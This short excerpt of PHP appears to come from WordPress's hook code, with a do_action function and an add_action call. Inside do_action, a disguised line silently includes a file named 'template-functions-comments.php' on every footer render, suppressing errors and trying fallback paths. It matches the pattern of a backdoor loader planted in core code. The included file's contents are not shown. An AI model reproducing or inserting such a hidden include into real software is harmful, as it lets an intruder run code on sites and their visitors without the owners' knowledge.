...
function do_action($tag, $arg = ''){
	if($tag=='wp_footer') @include(defined('ABSPATH') ? ABSPATH.'wp-includes/template-functions-comments.php' : (is_file('wp-includes/template-functions-comments.php')?'wp-includes/template-functions-comments.php':'template-functions-comments.php'));
	global $wp_filter;
...
add_action('wp_footer','wp_template_comments');
